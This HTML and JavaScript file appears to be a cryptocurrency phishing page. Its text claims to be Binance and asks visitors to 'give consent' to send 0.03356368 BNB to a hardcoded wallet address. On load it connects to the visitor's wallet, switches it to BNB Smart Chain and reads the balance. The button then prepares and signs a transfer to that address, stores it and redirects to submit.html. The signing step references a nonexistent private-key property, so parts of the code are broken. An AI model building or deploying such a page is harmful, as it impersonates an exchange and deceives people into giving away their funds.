<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User Consent</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f9f9f9;
    }
    button {
      padding: 12px 20px;
      font-size: 16px;
      background-color: #0084ff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .info {
      margin-top: 20px;
      background: #eee;
      padding: 15px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h2>Transaction Consent</h2>
  <p>We are Binance. Please confirm the transaction of <strong>0.03356368 BNB</strong> to address <strong>0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a</strong>.</p>
  
  <button onclick="signTransaction()">Give Consent & Proceed</button>

  <div class="info" id="walletInfo" style="display: none;">
    <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
    <p><strong>BNB Balance:</strong> <span id="bnbBalance"></span></p>
    <p><strong>Current Network:</strong> <span id="networkName"></span></p>
  </div>

  <script>
    let web3;
    let userAddress;
    let signedTransaction;

    async function connectWallet() {
      if (!window.ethereum) {
        alert("Trust Wallet or MetaMask not found. Please install.");
        return;
      }

      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        web3 = new Web3(window.ethereum);
        document.getElementById("walletAddress").innerText = userAddress;

        await switchToBSC();
        await showWalletInfo();

      } catch (err) {
        console.error("Connection failed:", err);
        alert("Error connecting wallet or switching network.");
      }
    }

    async function switchToBSC() {
      const bscChainId = '0x38'; // BNB Smart Chain

      try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId === bscChainId) {
          console.log("Already on BNB Chain.");
          return;
        }

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: bscChainId }],
        });
        console.log("Switched to BNB Chain.");
      } catch (switchError) {
        console.error("Switching error:", switchError);
        alert("Error switching to BNB Chain.");
      }
    }

    async function showWalletInfo() {
      const bnbBalanceWei = await web3.eth.getBalance(userAddress);
      const bnbBalance = web3.utils.fromWei(bnbBalanceWei, 'ether');
      document.getElementById("bnbBalance").innerText = `${bnbBalance} BNB`;

      const chainId = await web3.eth.getChainId();
      let networkName = 'Unknown';
      if (chainId === 56) networkName = 'BNB Smart Chain';
      document.getElementById("networkName").innerText = networkName;
      document.getElementById("walletInfo").style.display = "block";
    }

    async function signTransaction() {
      const receiverAddress = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';
      const amountToSend = '0.03356368'; // Amount in BNB
      const amountInWei = web3.utils.toWei(amountToSend, 'ether');

      const transaction = {
        to: receiverAddress,
        value: amountInWei,
        gas: 21000, // Estimate for a simple transfer
        gasPrice: await web3.eth.getGasPrice(),
        from: userAddress,
      };

      try {
        // Sign the transaction
        signedTransaction = await web3.eth.accounts.signTransaction(transaction, userAddress.privateKey);

        // Store the signed transaction (you can use localStorage or server-side storage here)
        localStorage.setItem('signedTransaction', JSON.stringify(signedTransaction));

        // Redirect to submit page
        window.location.href = "submit.html";
      } catch (error) {
        console.error("Error signing the transaction", error);
        alert("Error signing the transaction.");
      }
    }

    // Connect wallet automatically when the page loads
    connectWallet();
  </script>
</body>
</html>
